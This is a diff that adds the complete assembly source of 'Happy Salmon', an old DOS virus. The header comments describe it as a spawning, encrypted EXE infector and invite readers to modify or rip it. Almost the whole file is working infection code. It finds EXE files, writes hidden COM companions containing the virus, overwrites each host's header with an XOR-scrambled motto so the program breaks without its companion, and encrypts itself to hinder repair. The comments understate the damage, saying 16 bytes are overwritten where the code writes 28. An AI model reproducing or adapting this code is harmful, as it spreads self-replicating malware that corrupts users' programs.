@@ -1,0 +1,277 @@
+; Happy Salmon - Like fish, we spawn and die.
+; Spawning, Encrypted EXE Infector
+;
+; This virus is silly. It has no purpose, point, or meaning. I was bored
+; and felt like making something. It lacks any real content or even a
+; decent directory traversal routine. Adding one would make the virus more
+; effective at spreading. At 510 bytes, the virus tips the scales.
+;
+; Upon finding an EXE file to infect the virus creates a COM companion file.
+; It then proceeds to copy over the first 16 bytes of the file with the motto.
+; Without the COM file to fix-up the EXE at runtime the EXE's are effectively
+; trashed. The virus is encrypted to prevent easily making a patch to remove
+; the virus from afflicted EXE programs. There is no "destructive" code so
+; to speak.
+;
+; Feel free to mod/rip; that's why you have it!
+;
+
+code    segment public 'code'
+        assume  cs:code,ds:code,es:code,ss:code
+        org     100h
+        jumps
+
+start:
+       call     encrypt                  ; Duh
+
+virus:
+       mov      byte ptr flag,1          ; Fixup!
+       call     fixup_fuckup
+
+       mov      bx,offset endheap        ; End of Program
+       shr      bx,4                     ; Divide By 16
+       inc      bx                       ; Round Paragraphs Up
+       mov      ah,4Ah
+       int      21h                      ; Resize Memory
+
+       mov      stackseg,ss              ; Save Stack Seg
+       mov      stackptr,sp              ; Save Stack Ptr
+
+       mov      sp,offset endheap-offset start+100h ; Point Stack Here
+
+; Int 2Eh - SI Offset 0 = Size of String Not Including CR
+;           SI Offset 1 = String (gotta love that interrupt guide)
+
+       mov      si,offset spawn          ; Spawn Name
+       int      2Eh                      ; Execute
+
+       mov      ss,stackseg              ; Restore Stack
+       mov      sp,stackptr
+
+       push     cs
+       pop      ds                       ; Local
+
+       push     cs
+       pop      es                       ; Ditto
+
+       mov      byte ptr flag,0
+       call     fixup_fuckup             ; Fuckup!
+
+
+       mov      ah,47h
+       xor      cx,cx
+       mov      si,offset curdir
+       int      21h                      ; Get Current Dir
+
+       mov      ah,2Ch
+       int      21h
+       mov      word ptr encval,dx
+
+       mov      dx,offset dta
+       mov      ah,1Ah
+       int      21h                     ; Set New DTA
+
+       mov      dx,offset exespec
+       mov      ah,4Eh                  ; Find First *.E*
+
+find_file:
+       int      21h
+       jc       drop_dir
+
+       call     baby_maker
+
+       cmp      byte ptr run,3
+       jge      quit
+
+find_next:
+       mov      ah,4Fh
+       jmp      short find_file
+
+drop_dir:
+       mov      ah,3Bh
+       mov      dx,offset dotdot
+       int      21h
+       jc       quit
+       ret
+
+baby_maker:
+
+       mov      si,offset dta+30
+       mov      di,offset asciiz
+asc:
+       lodsb
+       stosb
+       cmp      al,0
+       jne      asc
+
+       mov      si,offset dta+30
+       mov      di,offset spawn+1
+       mov      dx,di
+       xor      ax,ax
+
+exe2com:
+       lodsb                            ; SI->AL
+       stosb                            ; AL->DI
+       inc      ah                      ; Counter
+       cmp      al,'.'                  ; Check For Null
+       jne      exe2com
+
+       mov      word ptr [di],'OC'
+       mov      word ptr [di+2], 04Dh   ; Temporarily It's a ASCIIZ COM Name
+
+       add      ah,3                    ; For Extension
+       mov      byte ptr offset spawn,ah
+
+       mov      cx,00100011b            ; Create Our COM File
+       mov      ah,05Bh                 ; Unlike 3Ch this Fails if File Exists
+       int      21h
+       jc       find_next
+
+       inc      byte ptr run
+       xchg     bx,ax                   ; BX=File Handle
+
+       mov      word ptr [di],   'XE'
+       mov      word ptr [di+2], 0D45h  ; CR+'E' Make Back Into EXE File
+
+       mov      ah,40h
+       mov      dx,offset start
+       mov      cx,offset virus-start
+       int      21h                     ; Write To Disk
+
+       inc      word ptr encval
+
+       mov      byte ptr flag,0
+       call     fixup_fuckup
+
+       call     q_encrypt               ; Encrypt/Write
+
+       mov      ah,03Eh
+       int      21h                     ; Close File
+       jmp      short quit
+
+fixup_fuckup:
+       push     bx
+
+       mov      dx,offset asciiz
+       mov      ax,3D02h
+       int      21h                     ; Open Original EXE File
+
+       xchg     bx,ax                   ; BX=File Handle
+
+       mov      ax,4200h
+       xor      cx,cx
+       cwd
+       int      21h                     ; Move to Beginning of File
+
+       cmp      byte ptr flag,1
+       je       fixup
+
+       mov      ah,3Fh
+       mov      cx,28
+       mov      dx,offset bbyte
+       int      21h
+
+       mov      ax,4200h
+       xor      cx,cx
+       cwd
+       int      21h                     ; Move to Beginning of File
+
+       mov      cx,14
+       mov      si,offset motto
+       mov      di,offset xorred_motto
+       mov      dx,sp                   ; An Nice Way to Get Encrypt Value
+
+fuck_motto:
+       lodsw
+       xor      ax,dx
+       stosw
+       loop     fuck_motto              ; Scramble Motto
+
+       mov      ah,40h
+       mov      dx,offset xorred_motto
+       mov      cx,28
+       int      21h                     ; Overwrite 28 Bytes With Motto
+       jmp      short close
+
+fixup:
+       mov      ah,40h
+       mov      dx,offset bbyte
+       mov      cx,28
+       int      21h                     ; Fix File
+close:
+       mov      ah,03Eh
+       int      21h
+       pop      bx
+       ret
+
+quit:
+
+       mov      ah,3Bh
+       mov      dx,offset curdir
+       xor      cx,cx
+       int      21h                     ; Restore Orig Directory
+
+       mov      ah,4Ch
+       int      21h                     ; Quit
+
+exespec   db     '*.E*',0               ; Look For This
+spawn     db     13,13 dup(0),13        ; Spawn Name
+
+vname     db    '[Happy Salmon]'        ; It's Huge Already, Why Not :)
+vwhom     db    '[Nemesis]'
+vwhere    db    '[USA]'
+motto     db    'Like fish, we spawn and die.'
+bbyte     db     28 dup (0)
+asciiz    db     13 dup (0)
+dotdot    db    '..',0
+
+q_encrypt:
+       mov      si,offset move_str
+       mov      di,offset space
+       mov      cx,offset move_end-move_str
+       rep      movsb                   ; Move The Next Routine Into
+                                        ; Memory
+       mov      dx,offset space
+       call     dx                      ; Call The Copied Routine
+       ret
+
+move_str:
+       mov      dx,offset encrypt
+       call     dx                      ; Encrypt File
+
+       mov      dx,offset virus         ; Starting Here
+       mov      cx,offset heap-virus    ; This Many Bytes
+       mov      ah,40h
+       int      21h                     ; Write It To Disk
+
+       mov      dx,offset encrypt
+       call     dx                      ; Unencrypt
+       ret
+move_end:
+
+encrypt:
+       mov      di,word ptr encval
+       mov      si,offset virus
+       mov      cx,(offset move_end-offset virus)/2
+xorit:
+       xor      word ptr [si],di
+       inc      si
+       inc      si
+       loop     xorit
+       ret
+encval    dw     0
+
+;------------[Not Written to Disk]-------------------------------------------
+heap:
+dta              db     42   dup (?)           ; New DTA
+stackseg         dw     ?
+stackptr         dw     ?
+space            db     offset move_end-offset move_str dup(?)
+run              db     ?
+flag             db     ?
+curdir           db     64  dup (?)
+xorred_motto     dw     14  dup  (?)
+endheap:
+
+code ends
+end start
